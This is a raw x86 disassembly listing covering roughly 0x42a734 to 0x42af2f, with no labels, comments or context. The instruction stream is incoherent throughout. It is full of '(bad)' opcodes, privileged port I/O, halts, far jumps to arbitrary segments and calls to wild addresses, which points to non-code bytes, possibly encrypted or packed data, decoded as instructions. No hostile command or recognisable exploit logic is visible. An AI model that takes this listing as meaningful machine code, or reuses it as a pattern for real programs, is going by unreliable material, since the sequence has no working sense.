  42a734:	mov    esp,0xdcb8bec1
  42a739:	fsubrp st(7),st
  42a73b:	pop    es
  42a73c:	add    dh,bh
  42a73e:	cld    
  42a73f:	ror    dh,0xce
  42a742:	call   0xca1b751a
  42a747:	ret    0xead7
  42a74a:	mov    ah,0xc4
  42a74c:	mov    cl,0xcd
  42a74e:	cmc    
  42a74f:	mov    al,0xcf
  42a751:	jecxz  0x42a74b
  42a753:	cli    
  42a754:	mov    ebx,0xf2c1c003
  42a759:	sti    
  42a75a:	mov    DWORD PTR [esi],0xdf0afbd4
  42a760:	(bad)  
  42a761:	or     esi,ecx
  42a763:	in     al,dx
  42a764:	mov    edi,0xd5dea8e8
  42a769:	in     eax,dx
  42a76a:	in     al,0xb4
  42a76c:	in     eax,dx
  42a76d:	out    0xc9,eax
  42a76f:	mov    esi,0xbff7bcb7
  42a774:	shl    bh,1
  42a776:	cmc    
  42a777:	cmc    
  42a778:	vshufps ymm7,ymm2,ymm0,0xd6
  42a77d:	enter  0xc6d8,0xe4
  42a781:	or     ebp,edi
  42a783:	fsubr  QWORD PTR [ebp-0x4a5b2953]
  42a789:	retf   0xa8cc
  42a78c:	repnz cli 
  42a78e:	(bad)  
  42a78f:	div    esp
  42a791:	call   0xbd158172
  42a796:	clc    
  42a797:	repz (bad) 
  42a79a:	fnstcw WORD PTR [eax-0x9213d09]
  42a7a0:	aam    0xff
  42a7a2:	jecxz  0x42a78f
  42a7a4:	scas   al,BYTE PTR es:[edi]
  42a7a5:	out    dx,al
  42a7a6:	(bad)  
  42a7a8:	ror    ebp,0xc1
  42a7ab:	mov    bh,0xca
  42a7ad:	(bad)  
  42a7ae:	out    0xbf,al
  42a7b0:	mov    ch,0xbb
  42a7b2:	xlat   BYTE PTR ds:[ebx]
  42a7b3:	sar    cl,1
  42a7b5:	std    
  42a7b6:	(bad)  
  42a7b8:	mov    ebp,0xebb8cbf4
  42a7bd:	retf   
  42a7be:	aad    0x7
  42a7c0:	jmp    0x42a7a6
  42a7c2:	(bad)
  42a7c5:	mov    al,0xd3
  42a7c7:	ret    
  42a7c8:	in     al,dx
  42a7c9:	out    0xc4,eax
  42a7cb:	aam    0xf2
  42a7cd:	call   0xcd009197
  42a7d2:	mov    edx,0xf6d6fcbb
  42a7d7:	out    dx,al
  42a7d8:	add    al,0xd2
  42a7da:	or     esi,ecx
  42a7dc:	ror    bl,0xc6
  42a7df:	out    dx,al
  42a7e0:	(bad)  
  42a7e2:	sti    
  42a7e3:	or     eax,0xa4bdcae6
  42a7e8:	ror    dh,cl
  42a7ea:	in     al,0xc8
  42a7ec:	icebp  
  42a7ed:	shl    esi,1
  42a7ef:	int3   
  42a7f0:	idiv   ebp
  42a7f2:	sti    
  42a7f3:	loope  0x42a7cd
  42a7f5:	shr    edi,1
  42a7f7:	add    al,BYTE PTR [ebx]
  42a7f9:	rcl    cl,cl
  42a7fb:	jmp    0x64d7dd5
  42a800:	leave  
  42a801:	call   0xc7007014
  42a806:	call   0xf0f979fd
  42a80b:	cmc    
  42a80c:	jmp    0x2ba:0xd9b4fed3
  42a813:	retf   0xcdd2
  42a816:	faddp  st(1),st
  42a818:	fsubr  st,st(3)
  42a81a:	rol    DWORD PTR [eax],0xf8
  42a81d:	fild   DWORD PTR [ecx]
  42a81f:	leave  
  42a820:	out    0xe0,al
  42a822:	in     al,dx
  42a823:	retf   
  42a824:	mov    dl,0xbd
  42a826:	ret    0xb1dc
  42a829:	loop   0x42a7dc
  42a82b:	rcl    dl,0xd2
  42a82e:	(bad)  
  42a82f:	std    
  42a830:	mov    dh,0xfc
  42a832:	leave  
  42a833:	(bad)  
  42a835:	stc    
  42a836:	(bad)  
  42a837:	not    ah
  42a839:	rcl    esi,1
  42a83b:	ret    0xf5de
  42a83e:	hlt    
  42a83f:	sti    
  42a840:	push   es
  42a841:	out    dx,eax
  42a842:	ror    DWORD PTR [esi+ebp*4],0xd3
  42a846:	scas   eax,DWORD PTR es:[edi]
  42a847:	mov    bh,0xab
  42a849:	in     eax,dx
  42a84a:	loopne 0x42a836
  42a84c:	repnz fcom st(1)
  42a84f:	mov    eax,0xeef7f6cb
  42a854:	test   ecx,0x105d2c0
  42a85a:	add    ebp,ebx
  42a85c:	add    dh,dl
  42a85e:	out    dx,al
  42a85f:	(bad)
  42a862:	enter  0xabff,0xed
  42a866:	call   0xe40b8c54
  42a86b:	mov    bh,0xc0
  42a86d:	hlt    
  42a86e:	push   DWORD PTR [esi-0x8342831]
  42a874:	fld    st(3)
  42a876:	cli    
  42a877:	fadd   st,st(5)
  42a879:	in     al,0xe7
  42a87b:	les    eax,FWORD PTR [edi]
  42a87d:	enter  0xcbfb,0xdc
  42a881:	loopne 0x42a86b
  42a883:	adc    cl,bl
  42a885:	out    dx,al
  42a886:	repnz lock imul DWORD PTR [esi-0x4b2d0932]
  42a88e:	sti    
  42a88f:	retf   
  42a890:	int    0xce
  42a892:	retf   
  42a893:	hlt    
  42a894:	mov    edx,0xd0dfdebc
  42a899:	in     al,0xf5
  42a89b:	cli    
  42a89c:	add    eax,DWORD PTR [edx]
  42a89e:	add    ah,bh
  42a8a0:	in     al,dx
  42a8a1:	loope  0x42a8a8
  42a8a3:	fmul   st(2),st
  42a8a5:	jmp    0xd7ac:0xe9f0a4eb
  42a8ac:	int3   
  42a8ad:	stc    
  42a8ae:	(bad)  
  42a8af:	mov    esi,0xd6b4dee9
  42a8b4:	mul    ebx
  42a8b6:	mov    ebp,0xfadef2f7
  42a8bb:	mov    esp,0xf4d7c0c2
  42a8c0:	call   0xf044a3ce
  42a8c5:	loop   0x42a8bd
  42a8c7:	in     al,dx
  42a8c8:	in     eax,0xe1
  42a8ca:	(bad)  
  42a8cb:	test   al,0xe9
  42a8cd:	mov    ebx,0xcbefdef7
  42a8d2:	call   0xd2fd9f92
  42a8d7:	(bad)  
  42a8d9:	fdivrp st(3),st
  42a8db:	fucomi st,st(3)
  42a8dd:	call   0xdb3fa5df
  42a8e2:	or     eax,0xb2e1c9ff
  42a8e7:	retf   0xb7ab
  42a8ea:	mov    ebx,0xebd1cbc1
  42a8ef:	div    edx
  42a8f1:	mov    ah,0xfd
  42a8f3:	clc    
  42a8f4:	shl    cl,cl
  42a8f6:	hlt    
  42a8f7:	fistp  QWORD PTR [ebx+0x6c002db]
  42a8fd:	fst    st(5)
  42a8ff:	(bad)  
  42a900:	(bad)  
  42a901:	inc    BYTE PTR [ebx]
  42a903:	int    0xae
  42a905:	jmp    0xf7e8:0xf0b0ecdc
  42a90c:	cmc    
  42a90d:	mov    dh,0xee
  42a90f:	std    
  42a910:	jmp    0xced5:0xced3d3bf
  42a917:	lock fstp st(5)
  42a91a:	jmp    0x9fc:0x4fcd609
  42a921:	retf   0x2c1
  42a924:	iret   
  42a925:	repnz retf 0xd2e4
  42a929:	aad    0xc1
  42a92b:	aad    0xb6
  42a92d:	(bad)  
  42a92e:	icebp  
  42a92f:	mov    ch,0xdb
  42a931:	clc    
  42a932:	iret   
  42a933:	fucom  st(0)
  42a935:	(bad)  
  42a937:	push   es
  42a938:	cli    
  42a939:	mov    esi,0xe4e6d206
  42a93e:	(bad)  
  42a93f:	hlt    
  42a940:	in     al,dx
  42a941:	in     eax,0xfc
  42a943:	in     eax,0xdf
  42a945:	jmp    0xb5b5:0xdbe2f2e9
  42a94c:	(bad)  
  42a94d:	fcmovbe st,st(3)
  42a94f:	int3   
  42a950:	mov    ebp,0xf8b8e2d3
  42a955:	loop   0x42a93e
  42a957:	not    bh
  42a959:	stc    
  42a95a:	fadd   DWORD PTR [ecx]
  42a95c:	loop   0x42a95a
  42a95e:	enter  0xcee4,0xe1
  42a962:	adc    bl,cl
  42a964:	in     al,0xb3
  42a966:	int3   
  42a967:	enter  0xf4f5,0xd4
  42a96b:	fnstenv [ebp-0x300f314f]
  42a971:	mov    ebp,0xf501deeb
  42a976:	clc    
  42a977:	push   es
  42a978:	(bad)
  42a97c:	add    al,0xf7
  42a97e:	add    edi,ecx
  42a980:	add    bl,dh
  42a982:	jmp    0xe607714f
  42a987:	enter  0xb1f4,0xc2
  42a98b:	xlat   BYTE PTR ds:[ebx]
  42a98c:	(bad)  
  42a98d:	retf   0xb4c7
  42a990:	idiv   BYTE PTR [ebx-0x2501460e]
  42a996:	clc    
  42a997:	int    0xd4
  42a999:	cli    
  42a99a:	fucom  st(2)
  42a99c:	jmp    0xc91b8277
  42a9a1:	inc    ch
  42a9a3:	or     al,0xde
  42a9a5:	shr    BYTE PTR [ebp-0x25175416],0xca
  42a9ac:	fprem  
  42a9ae:	mov    ecx,0xe3bfd1df
  42a9b3:	mov    ecx,0xd5e3cdfe
  42a9b8:	add    dl,dl
  42a9ba:	stc    
  42a9bb:	rcr    bh,cl
  42a9bd:	stc    
  42a9be:	cli    
  42a9bf:	cli    
  42a9c0:	std    
  42a9c1:	ret    0x3e9
  42a9c4:	jecxz  0x42a97e
  42a9c6:	shl    ebp,1
  42a9c8:	loop   0x42a98e
  42a9ca:	shr    DWORD PTR [eax+ecx*8-0x153b0535],1
  42a9d1:	cld    
  42a9d2:	fstp   st(2)
  42a9d4:	aad    0xb8
  42a9d6:	xlat   BYTE PTR ds:[ebx]
  42a9d7:	sar    ah,cl
  42a9d9:	ret    0x9fd
  42a9dc:	aam    0xdc
  42a9de:	not    ch
  42a9e0:	fxch   st(0)
  42a9e2:	int3   
  42a9e3:	(bad)  
  42a9e4:	mov    dl,0xb3
  42a9e6:	int3   
  42a9e7:	fsubr  st(6),st
  42a9e9:	mov    ah,0xd4
  42a9eb:	in     al,0xd2
  42a9ed:	jmp    0x42a9d6
  42a9ef:	imul   dl
  42a9f1:	cli    
  42a9f2:	cli    
  42a9f3:	aam    0xe0
  42a9f5:	fcom   st(3)
  42a9f7:	add    eax,0xe6d4fddb
  42a9fc:	hlt    
  42a9fd:	mov    esi,0xf3fed5da
  42aa02:	adc    ecx,esp
  42aa04:	fsubr  st(0),st
  42aa06:	out    0xb7,al
  42aa08:	shl    BYTE PTR [edi-0x3839252c],cl
  42aa0e:	lock (bad) 
  42aa10:	sar    BYTE PTR [esi+0x7d302b5],cl
  42aa16:	(bad)  
  42aa17:	cli    
  42aa18:	sti    
  42aa19:	add    cl,dh
  42aa1b:	cld    
  42aa1c:	(bad)  
  42aa1d:	fcmovne st,st(1)
  42aa1f:	stc    
  42aa20:	or     cl,BYTE PTR ds:0xe8d313df
  42aa26:	sar    BYTE PTR [ecx+ecx*8-0xe244e4e],cl
  42aa2d:	repnz mov dh,0xca
  42aa30:	call   ebx
  42aa32:	idiv   BYTE PTR [esi-0x23260d24]
  42aa38:	shl    esi,0xf3
  42aa3b:	mul    ah
  42aa3d:	(bad)  
  42aa3e:	in     eax,0xdd
  42aa40:	push   es
  42aa41:	int    0xf9
  42aa43:	in     eax,dx
  42aa44:	mov    edi,0xada8f3a6
  42aa49:	vpand  ymm1,ymm1,ymm4
  42aa4d:	mov    eax,0xb6ffd7ef
  42aa52:	mov    edx,0xe003ddbe
  42aa57:	in     eax,0xbb
  42aa59:	add    esp,esi
  42aa5b:	test   al,0xd6
  42aa5e:	or     ebp,edx
  42aa60:	or     edx,DWORD PTR [ebx]
  42aa62:	or     cl,bl
  42aa64:	loope  0x42aa38
  42aa66:	mov    bh,0xc1
  42aa68:	mov    ebp,0xefccedb0
  42aa6d:	into   
  42aa6e:	cli    
  42aa6f:	fcomi  st,st(3)
  42aa71:	(bad)  
  42aa72:	xlat   BYTE PTR ds:[ebx]
  42aa73:	repz ror ebp,0xf2
  42aa77:	int3   
  42aa78:	mul    edx
  42aa7a:	rol    ebx,1
  42aa7c:	push   es
  42aa7d:	(bad)  
  42aa7f:	std    
  42aa80:	out    0x6,al
  42aa82:	loop   0x42aa5d
  42aa84:	in     eax,0xd7
  42aa86:	idiv   BYTE PTR [ebp-0x2912142a]
  42aa8c:	les    edi,FWORD PTR [edx-0x37011139]
  42aa92:	cld    
  42aa93:	cld    
  42aa94:	jmp    0xfc3f9980
  42aa99:	shl    ecx,1
  42aa9b:	or     cl,BYTE PTR [eax]
  42aa9d:	pop    es
  42aa9e:	loop   0x42aa76
  42aaa0:	aad    0xde
  42aaa2:	in     al,0xdd
  42aaa4:	jmp    0xb0219e92
  42aaa9:	stos   BYTE PTR es:[edi],al
  42aaaa:	aam    0xd5
  42aaac:	out    dx,eax
  42aaad:	into   
  42aaae:	out    0xd0,al
  42aab0:	out    dx,eax
  42aab1:	mov    ecx,0xf1ffed03
  42aab6:	sar    DWORD PTR [esi-0x1c050b30],1
  42aabc:	add    al,0xd6
  42aabe:	jmp    0xd007769b
  42aac3:	add    eax,edx
  42aac5:	scas   al,BYTE PTR es:[edi]
  42aac6:	jmp    0xd9c2:0xd5b3bce9
  42aacd:	fcmovnu st,st(7)
  42aacf:	mov    ah,0xfc
  42aad1:	hlt    
  42aad2:	mov    ah,0xfd
  42aad4:	(bad)  
  42aad6:	clc    
  42aad7:	fsubrp st(2),st
  42aad9:	in     eax,0xc6
  42aadb:	fst    st(6)
  42aadd:	out    0xa,al
  42aadf:	jecxz  0x42aacd
  42aae1:	add    ecx,DWORD PTR [ecx]
  42aae3:	loop   0x42aa9d
  42aae5:	ret    0xeee9
  42aae8:	jmp    0xc50893d3
  42aaed:	jmp    0x42aab9
  42aaef:	iret   
  42aaf0:	mov    edx,0xd8dcf2ec
  42aaf5:	pop    es
  42aaf6:	add    ah,cl
  42aaf8:	hlt    
  42aaf9:	cmc    
  42aafa:	stc    
  42aafb:	(bad)  
  42aafd:	or     eax,DWORD PTR [eax]
  42aaff:	push   cs
  42ab00:	add    al,0xfe
  42ab02:	out    0xc4,eax
  42ab04:	mov    dl,0xf2
  42ab06:	(bad)
  42ab09:	enter  0xb2b3,0xee
  42ab0d:	cmc    
  42ab0e:	lock repnz clc 
  42ab11:	cli    
  42ab12:	add    edi,esi
  42ab14:	in     eax,dx
  42ab15:	jecxz  0x42aaef
  42ab17:	repz xlat BYTE PTR ds:[ebx]
  42ab19:	(bad)  
  42ab1a:	fsincos 
  42ab1c:	clc    
  42ab1d:	add    al,0xc5
  42ab1f:	inc    BYTE PTR [ebx]
  42ab21:	in     eax,dx
  42ab22:	or     eax,0xcef1aff3
  42ab27:	mov    bl,0xd4
  42ab29:	(bad)
  42ab2c:	mov    al,0xd9
  42ab2e:	sar    ecx,cl
  42ab30:	fdivp  st(6),st
  42ab32:	xlat   BYTE PTR ds:[ebx]
  42ab33:	call   0xc7199ff4
  42ab38:	fdivr  st,st(0)
  42ab3a:	ror    DWORD PTR [ecx],0xb
  42ab3d:	shl    dh,0xc5
  42ab40:	jmp    0x42ab3e
  42ab42:	clc    
  42ab43:	add    ch,ch
  42ab45:	mov    esp,0xd5cfaca8
  42ab4a:	mov    cl,0xfa
  42ab4c:	icebp  
  42ab4d:	hlt    
  42ab4e:	cli    
  42ab4f:	fidivr DWORD PTR [ebp-0xb0f142d]
  42ab55:	(bad)  
  42ab57:	out    0xdc,eax
  42ab59:	(bad)
  42ab5c:	pop    es
  42ab5d:	add    ecx,edi
  42ab5f:	inc    BYTE PTR [ecx]
  42ab61:	stc    
  42ab62:	leave  
  42ab63:	clc    
  42ab64:	retf   0xe1e2
  42ab67:	into   
  42ab68:	in     eax,dx
  42ab69:	enter  0xb7d6,0xb3
  42ab6d:	mov    eax,0xb4d6f1e6
  42ab72:	aad    0x2
  42ab74:	(bad)  
  42ab75:	(bad)  
  42ab77:	(bad)  
  42ab78:	repnz (bad) 
  42ab7a:	xlat   BYTE PTR ds:[ebx]
  42ab7b:	out    0xf6,eax
  42ab7d:	test   DWORD PTR [esi],0xff03cdef
  42ab83:	cld    
  42ab84:	(bad)  [eax-0xe343e58]
  42ab8a:	out    0xd9,al
  42ab8c:	jmp    0xebcb:0xc9f4bbb2
  42ab93:	mov    al,0xf9
  42ab95:	repz clc 
  42ab97:	into   
  42ab98:	neg    edx
  42ab9a:	cli    
  42ab9b:	icebp  
  42ab9c:	cmc    
  42ab9d:	ret    0xfdeb
  42aba0:	jmp    0x42ab8c
  42aba2:	out    dx,al
  42aba3:	clc    
  42aba4:	mov    ecx,0xd3c8d1be
  42aba9:	mov    al,0xea
  42abab:	out    dx,al
  42abac:	neg    al
  42abae:	(bad)
  42abb1:	retf   0xf0b1
  42abb4:	in     al,dx
  42abb5:	ret    0xd4d4
  42abb8:	(bad)  
  42abb9:	stc    
  42abba:	loope  0x42ab9f
  42abbc:	or     dl,bh
  42abbe:	out    dx,eax
  42abbf:	cld    
  42abc0:	sti    
  42abc1:	stc    
  42abc2:	iret   
  42abc3:	add    bh,al
  42abc5:	out    0xd2,eax
  42abc7:	call   0xce3ea17c
  42abcc:	ror    edx,cl
  42abce:	repnz out 0xc5,al
  42abd1:	int    0xf9
  42abd3:	hlt    
  42abd4:	call   0xd73d7e9c
  42abd9:	inc    DWORD PTR [eax]
  42abdb:	add    al,BYTE PTR [edi]
  42abdd:	call   0xfe0b71e8
  42abe2:	fucomp st(6)
  42abe4:	loopne 0x42ab96
  42abe6:	mov    esp,0xd6e4c7b1
  42abeb:	(bad)  
  42abec:	aam    0xf4
  42abee:	div    dl
  42abf0:	repnz clc 
  42abf2:	stc    
  42abf3:	int    0xd0
  42abf5:	xlat   BYTE PTR ds:[ebx]
  42abf6:	add    esi,eax
  42abf8:	aad    0xc6
  42abfa:	add    eax,0xe108c1c7
  42abff:	cld    
  42ac00:	(bad)  
  42ac02:	repz adc esi,ecx
  42ac05:	ret    0xf1c1
  42ac08:	mov    cl,0xe1
  42ac0a:	mov    ebx,0xf7cff9f0
  42ac0f:	(bad)  
  42ac10:	in     eax,dx
  42ac11:	fcom   st(7)
  42ac13:	mov    ecx,0xd1dffec8
  42ac18:	mov    esp,0x7c6f6d3
  42ac1d:	call   0xfd41a828
  42ac22:	jmp    0x42ac0b
  42ac24:	fucomip st,st(5)
  42ac26:	(bad)
  42ac29:	xlat   BYTE PTR ds:[ebx]
  42ac2a:	jmp    0x42ac17
  42ac2c:	mov    ah,0xec
  42ac2e:	les    esi,FWORD PTR [edi+edi*8-0xb07414e]
  42ac35:	repnz add ch,bh
  42ac38:	mov    ebp,0xfcebd0fc
  42ac3d:	(bad)  
  42ac3e:	fiadd  DWORD PTR [edi]
  42ac40:	jmp    0xc2bc:0xacedcde1
  42ac47:	out    dx,al
  42ac48:	out    dx,eax
  42ac49:	out    0xad,eax
  42ac4b:	rcr    dl,cl
  42ac4d:	(bad)  
  42ac4e:	stc    
  42ac4f:	fcomp  st(1)
  42ac51:	(bad)  
  42ac53:	ret    
  42ac54:	mov    ebp,0xfe03b9dd
  42ac59:	mov    ebp,0xea0bd4f2
  42ac5e:	aad    0xc7
  42ac60:	int    0xca
  42ac62:	adc    eax,DWORD PTR [ebx]
  42ac64:	mov    esi,0xecaef0bd
  42ac69:	mov    ah,0xd7
  42ac6b:	lods   al,BYTE PTR ds:[esi]
  42ac6c:	mov    edx,0xd6d7dab9
  42ac71:	sti    
  42ac72:	mov    ebx,0xfac2c1d7
  42ac77:	cld    
  42ac78:	out    0xc2,al
  42ac7a:	mov    ecx,0xee01d6f0
  42ac7f:	into   
  42ac80:	fild   WORD PTR [esi]
  42ac82:	or     bl,cl
  42ac84:	(bad)  
  42ac86:	repz int3 
  42ac88:	out    dx,al
  42ac89:	lods   eax,DWORD PTR ds:[esi]
  42ac8a:	repnz in al,0xfb
  42ac8d:	mov    al,0xe8
  42ac8f:	in     eax,0xd7
  42ac91:	mov    dl,0xd1
  42ac93:	mov    al,0xc2
  42ac95:	(bad)  
  42ac96:	fdivp  st(5),st
  42ac98:	out    0xf6,al
  42ac9a:	jecxz  0x42ac96
  42ac9c:	rol    BYTE PTR [edx],0xf8
  42ac9f:	(bad)  
  42aca1:	clc    
  42aca2:	push   cs
  42aca3:	jmp    0xb4058086
  42aca8:	retf   
  42aca9:	aad    0xe9
  42acab:	(bad)  
  42acac:	fdivr  st,st(3)
  42acae:	int    0xd3
  42acb0:	mov    edi,0xe9fcbaec
  42acb5:	shl    ebx,1
  42acb7:	add    dh,dh
  42acb9:	fdiv   st(4),st
  42acbb:	loope  0x42ac92
  42acbd:	rcr    ebx,0xcf
  42acc0:	fisttp DWORD PTR [eax]
  42acc2:	push   es
  42acc3:	push   es
  42acc4:	shl    DWORD PTR [eax-0x53193a32],cl
  42acca:	mov    cl,0xd1
  42accc:	mov    dh,0xdf
  42acce:	div    cl
  42acd0:	fxch   st(7)
  42acd2:	add    dl,al
  42acd4:	neg    ah
  42acd6:	fcmovbe st,st(6)
  42acd8:	aam    0xcc
  42acda:	add    eax,0xf8e3f6f4
  42acdf:	jmp    0xc7cf:0xdfdbe1d5
  42ace6:	mov    esp,0xb4b0e5b0
  42aceb:	enter  0xc6d2,0xe8
  42acef:	hlt    
  42acf0:	jmp    0x42aca7
  42acf2:	fdivr  QWORD PTR [ebx+ebx*8-0x2e060d2a]
  42acf9:	icebp  
  42acfa:	rcr    ah,0x5
  42acfd:	lock aam 0x4
  42ad00:	add    dh,bl
  42ad02:	or     bl,bh
  42ad04:	in     al,0xce
  42ad06:	fmul   st(5),st
  42ad08:	mov    ebp,0xf2eff1e6
  42ad0d:	mov    cl,0xe4
  42ad0f:	xlat   BYTE PTR ds:[ebx]
  42ad10:	std    
  42ad11:	les    edi,FWORD PTR [ebp-0x4a32111f]
  42ad17:	add    al,bl
  42ad19:	int3   
  42ad1a:	rol    DWORD PTR [eax],0x3
  42ad1d:	ret    0xbd4
  42ad20:	aad    0xe6
  42ad22:	leave  
  42ad23:	(bad)  
  42ad24:	jmp    0x42acf5
  42ad26:	scas   eax,DWORD PTR es:[edi]
  42ad27:	xlat   BYTE PTR ds:[ebx]
  42ad28:	ret    
  42ad29:	mov    cl,0xb7
  42ad2b:	sar    ecx,1
  42ad2d:	loopne 0x42ad22
  42ad2f:	mov    ebx,0xdad2caee
  42ad34:	clc    
  42ad35:	in     eax,dx
  42ad36:	ret    0xd402
  42ad39:	stc    
  42ad3a:	hlt    
  42ad3b:	rcl    cl,0x9
  42ad3e:	loopne 0x42ad39
  42ad40:	in     al,0x0
  42ad42:	retf   
  42ad43:	stc    
  42ad44:	fcomip st,st(2)
  42ad46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad47:	mov    dl,0xe1
  42ad49:	mov    ch,0xb1
  42ad4b:	icebp  
  42ad4c:	loopne 0x42ad1c
  42ad4e:	fcmovne st,st(4)
  42ad50:	mov    ah,0xb5
  42ad52:	mov    ecx,0xdad0dfb8
  42ad57:	add    al,bh
  42ad59:	xlat   BYTE PTR ds:[ebx]
  42ad5a:	clc    
  42ad5b:	or     dh,ah
  42ad5d:	(bad)  
  42ad5e:	test   DWORD PTR [ebx],0xf9e204f5
  42ad64:	jmp    0xc9d0:0xe5b1f3bc
  42ad6b:	mov    ebx,0xfab5b8e0
  42ad70:	ror    dl,1
  42ad72:	(bad)  
  42ad73:	mov    ah,0xf0
  42ad75:	add    al,bh
  42ad77:	shl    ah,0x3
  42ad7a:	hlt    
  42ad7b:	fdivrp st(4),st
  42ad7d:	add    al,ah
  42ad7f:	in     eax,0xe3
  42ad81:	por    mm1,mm0
  42ad84:	iret   
  42ad85:	lods   eax,DWORD PTR ds:[esi]
  42ad86:	mov    bl,0xe2
  42ad88:	int3   
  42ad89:	out    dx,eax
  42ad8a:	in     al,0xb1
  42ad8c:	mov    cl,0xf1
  42ad8e:	(bad)  
  42ad90:	mov    ch,0xd4
  42ad92:	shr    esp,cl
  42ad94:	cld    
  42ad95:	add    ebx,edi
  42ad97:	aad    0xe0
  42ad99:	add    dh,bl
  42ad9b:	lock xlat BYTE PTR ds:[ebx]
  42ad9d:	lds    ecx,FWORD PTR [eax]
  42ad9f:	push   cs
  42ada0:	out    dx,al
  42ada1:	out    dx,eax
  42ada2:	int    0xd
  42ada4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ada5:	out    dx,eax
  42ada6:	in     al,0xdc
  42ada8:	repz iret 
  42adaa:	(bad)  [edx-0x35000039]
  42adb0:	stc    
  42adb1:	mov    ah,0xfb
  42adb3:	mov    edi,0xfdb9bcf9
  42adb8:	add    al,0xfd
  42adba:	fcmovnu st,st(2)
  42adbc:	(bad)  
  42adbd:	(bad)  
  42adbf:	or     ebp,ebp
  42adc1:	jmp    0x42ada7
  42adc3:	fdiv   st,st(1)
  42adc5:	retf   0xd3dc
  42adc8:	loopne 0x42ad9f
  42adca:	out    dx,eax
  42adcb:	fidivr DWORD PTR [ecx-0x26212d1b]
  42add1:	mov    edx,0xeef8bbd1
  42add6:	shr    dh,cl
  42add8:	mov    ebx,0xf5c603be
  42addd:	out    dx,eax
  42adde:	jmp    0xff0e8de8
  42ade3:	cli    
  42ade4:	shl    DWORD PTR [ecx-0x3e0a1a22],1
  42adea:	aad    0xea
  42adec:	test   ah,0xda
  42adef:	in     eax,0xb3
  42adf1:	jmp    0x42adb0
  42adf3:	loope  0x42adf2
  42adf5:	mov    ecx,0xe3d3fef5
  42adfa:	imul   ecx
  42adfc:	add    eax,0x8fdf408
  42ae01:	jecxz  0x42ade0
  42ae03:	in     eax,0xa9
  42ae05:	mov    dl,0xc3
  42ae07:	lods   eax,DWORD PTR ds:[esi]
  42ae08:	mov    dl,0xec
  42ae0a:	mov    dl,0xda
  42ae0c:	sti    
  42ae0d:	hlt    
  42ae0e:	in     al,dx
  42ae0f:	ror    bh,1
  42ae11:	iret   
  42ae12:	xlat   BYTE PTR ds:[ebx]
  42ae13:	loope  0x42adfd
  42ae15:	test   BYTE PTR [ecx],0xf9
  42ae18:	int3   
  42ae19:	(bad)  
  42ae1a:	stc    
  42ae1b:	mov    cl,0xe1
  42ae1e:	(bad)  
  42ae1f:	retf   0xd4ea
  42ae22:	loope  0x42ae23
  42ae24:	ret    
  42ae25:	mov    ebp,0xf3e9eec5
  42ae2a:	test   eax,0xd9c4cac2
  42ae2f:	cmc    
  42ae30:	mov    ebp,0xd2b8fbed
  42ae35:	add    edi,edx
  42ae37:	fild   DWORD PTR [esp+edi*8]
  42ae3a:	jecxz  0x42ae18
  42ae3c:	clc    
  42ae3d:	(bad)  
  42ae3f:	or     DWORD PTR [eax],eax
  42ae41:	loope  0x42ae3d
  42ae43:	pavgw  mm3,mm5
  42ae46:	scas   al,BYTE PTR es:[edi]
  42ae47:	ret    0xe9cd
  42ae4a:	ret    0xbac4
  42ae4d:	mov    ch,0xd1
  42ae4f:	fnop   
  42ae51:	std    
  42ae52:	jmp    0x42ae41
  42ae54:	mov    edi,0x5cde3e7
  42ae59:	in     eax,0xfb
  42ae5b:	(bad)  
  42ae5e:	cld    
  42ae5f:	in     al,0xd
  42ae61:	loope  0x42ae5f
  42ae63:	adc    edi,eax
  42ae65:	in     eax,dx
  42ae66:	scas   al,BYTE PTR es:[edi]
  42ae67:	in     al,0xe1
  42ae69:	xlat   BYTE PTR ds:[ebx]
  42ae6a:	enter  0xd5cc,0xc5
  42ae6e:	hlt    
  42ae6f:	in     al,0xed
  42ae71:	not    ah
  42ae73:	(bad)  
  42ae74:	mov    ecx,0xc107ccdf
  42ae79:	in     eax,0xf7
  42ae7b:	repnz (bad) 
  42ae7e:	(bad)  
  42ae7f:	neg    bl
  42ae81:	inc    esp
  42ae83:	or     ebp,DWORD PTR [eax-0x291e2d31]
  42ae89:	shl    BYTE PTR [ebx-0x3800134b],cl
  42ae8f:	into   
  42ae90:	(bad)  
  42ae91:	fucom  st(3)
  42ae93:	cli    
  42ae94:	iret   
  42ae95:	add    al,BYTE PTR [ecx]
  42ae97:	lock int3 
  42ae99:	push   es
  42ae9a:	repnz mov eax,0xd6c4d9f5
  42aea0:	int    0xdc
  42aea2:	fsqrt  
  42aea4:	rcr    esp,cl
  42aea6:	in     al,0xc1
  42aea8:	loopne 0x42ae70
  42aeaa:	retf   
  42aeab:	mov    cl,0xb4
  42aead:	iret   
  42aeae:	(bad)  
  42aeaf:	fsubr  st,st(2)
  42aeb1:	in     al,dx
  42aeb2:	mov    esi,0xe1bcd8fb
  42aeb7:	into   
  42aeb8:	loopne 0x42ae77
  42aeba:	clc    
  42aebb:	(bad)  
  42aebc:	(bad)  
  42aebe:	or     eax,esp
  42aec0:	retf   0xbf9
  42aec3:	shr    BYTE PTR [esi-0x1a281514],cl
  42aec9:	ror    ebp,1
  42aecb:	enter  0xead0,0xcd
  42aecf:	hlt    
  42aed0:	mov    dh,0xee
  42aed2:	fcmovnbe st,st(5)
  42aed4:	inc    DWORD PTR [edi]
  42aed6:	into   
  42aed7:	fcom   st(7)
  42aed9:	imul   edx
  42aedb:	loope  0x42aea2
  42aedd:	fmul   DWORD PTR [eax]
  42aedf:	cld    
  42aee0:	(bad)  
  42aee2:	les    eax,FWORD PTR ds:0xefeae5c0
  42aee8:	lods   al,BYTE PTR ds:[esi]
  42aee9:	mov    dl,0xc5
  42aeeb:	mov    ecx,0xb7b0fbc9
  42aef1:	clc    
  42aef2:	(bad)  
  42aef3:	int    0xb7
  42aef5:	mov    esi,0xd9edf6d4
  42aefa:	(bad)  
  42aefc:	aad    0xe4
  42aefe:	ror    BYTE PTR [edx],0xea
  42af01:	add    eax,0xe9bf040b
  42af06:	retf   
  42af07:	iret   
  42af08:	shr    dl,cl
  42af0a:	int    0xb4
  42af0c:	cmc    
  42af0d:	fcmovnu st,st(3)
  42af0f:	aam    0xcc
  42af11:	rcr    ecx,cl
  42af13:	mov    ebp,0xddc1dcd0
  42af18:	add    eax,0xe5dcd3f5
  42af1d:	jmp    0xe73daa24
  42af22:	or     eax,0xf1def101
  42af27:	int    0xe8
  42af29:	lods   eax,DWORD PTR ds:[esi]
  42af2a:	out    0xfa,eax
  42af2c:	aam    0xd3
  42af2e:	hlt    
  42af2f:	(bad)  
